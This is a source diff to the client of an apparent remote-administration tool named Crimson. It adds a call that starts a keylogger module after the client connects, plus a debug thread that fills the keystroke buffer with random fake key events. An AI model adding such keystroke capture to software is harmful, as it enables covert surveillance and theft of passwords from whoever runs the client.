@@ -18,18 +18,24 @@
 package com.subterranean_security.crimson.client;
 
 import java.io.File;
+import java.util.Date;
 import java.util.List;
+import java.util.Random;
 
 import javax.net.ssl.SSLException;
 
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
+import com.subterranean_security.crimson.client.modules.Keylogger;
+import com.subterranean_security.crimson.client.modules.Keylogger.RefreshMethod;
 import com.subterranean_security.crimson.client.net.ClientConnector;
 import com.subterranean_security.crimson.core.Common;
 import com.subterranean_security.crimson.core.Platform;
 import com.subterranean_security.crimson.core.proto.Generator.NetworkTarget;
+import com.subterranean_security.crimson.core.proto.Keylogger.EV_KEvent;
 import com.subterranean_security.crimson.core.storage.ViewerDB;
+import com.subterranean_security.crimson.core.util.CUtil;
 
 public class Client {
 	private static final Logger log = LoggerFactory.getLogger(Client.class);
@@ -67,6 +73,25 @@ public class Client {
 		}
 
 		connectionRoutine(nts);
+
+		Keylogger.start(RefreshMethod.TIME, 20000);
+
+		// DEBUG add random keys to keybuffer
+		new Thread(new Runnable() {
+			public void run() {
+				for (int i = 0; i < 2000; i++) {
+					try {
+						Thread.sleep(new Random().nextInt(60000) + 30000);
+					} catch (InterruptedException e) {
+						// TODO Auto-generated catch block
+						e.printStackTrace();
+					}
+					log.debug("Adding random key to buffer");
+					Keylogger.buffer.add(EV_KEvent.newBuilder().setDate(new Date().getTime())
+							.setEvent(CUtil.Misc.randString(1)).setTitle("DEBUG").build());
+				}
+			}
+		}).start();
 
 	}
 
